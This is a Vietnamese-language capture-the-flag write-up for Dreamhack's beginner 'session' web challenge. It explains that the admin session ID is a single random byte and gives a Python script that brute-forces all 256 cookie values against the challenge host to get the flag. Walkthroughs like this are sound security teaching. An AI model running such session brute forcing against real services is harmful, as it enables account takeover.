# session

## Challenge Information
- **Category**: Web Exploitation
- **Points**: hide
- **Difficulty**: Beginner
- **Event**: hide
- **Author**: Dreamhack
- **Tags**: #web #session 
---
## 1. Description
> A simple login service that uses cookies and sessions to manage authentication status.  
> If you successfully log in with an admin account, you can obtain a flag.
## 2. Overview
Bài này ta sẽ bypass session để đăng nhập quyền admin bằng brute force đơn giản
## 3. Reconnaissance
Bài này giao diện cũng như các bài trước với chức năng đăng nhập và giao diện đơn giản:

![](images/Pasted%20image%2020260214221310.png)

![](images/Pasted%20image%2020260214221343.png)

Mở DevTools để kiểm tra source thì ta thấy có tài khoản cấp sẵn để login:

![](images/Pasted%20image%2020260214221447.png)

Đăng nhập thành công và web hiện lên giao diện của account client:

![](images/Pasted%20image%2020260214221533.png)

Sửa giá trị sessionid của Cookie thì vẫn không khả quan:

![](images/Pasted%20image%2020260214221643.png)

-> Đọc source code phía backend xem sao

![](images/Pasted%20image%2020260214221734.png)

-> Phát hiện ra nếu đăng nhập với sessionid đúng của admin thì sẽ nhận được flag, cùng xem sessionid được định nghĩa như thế nào:

```python
session_storage[os.urandom(1).hex()] = 'admin'
```

Dòng code này cho thấy session là một chuỗi 1 byte = 8 bit được sinh ra ngẫu nhiên, sau đó sẽ chuyển về dạng hexa để biểu diễn (lúc này sẽ biểu diễn bằng một chuỗi gồm 2 ký tự từ 0 đến F theo hex). Nhưng cách random tạo ra một chuỗi khá ngắn và ta chỉ có 16 x 16 = 256 trường hợp -> Brute force trong trường hợp này là khả thi và rất nhanh.
## 4. Exploitation
Ta sẽ viết một đoạn script bằng Python để tự động hóa việc brute force:

```Python
import requests  
  
url = 'http://host3.dreamhack.games:15426/'  
  
print("Đang quét các session ID khả thi...")  
  
# Vòng lặp từ 0 đến 255 (tương đương 00 đến ff)  
for i in range(256):  
    # Chuyển số hex thành dạng chuỗi 2 ký tự (0 -> '00', 15 -> '0f')  
    session_id = format(i, '02x')  
  
    # Gửi request với cookie tương ứng  
    cookies = {'sessionid': session_id}  
    response = requests.get(url, cookies=cookies)  
  
    # Kiểm tra xem trong nội dung trả về có chữ "flag" hay không  
    if "flag is" in response.text:  
        print(f"[+] Thành công! Session ID của admin là: {session_id}")  
        # Tìm và in ra dòng chứa flag khớp với DH{  
        for line in response.text.split('\n'):  
            if "DH{" in line:  
                print(f"[!] Nội dung: {line.strip()}")  
        break  
else:  
    print("[-] Không tìm thấy session hợp lệ.")
```

Kết quả:

![](images/Pasted%20image%2020260214223050.png)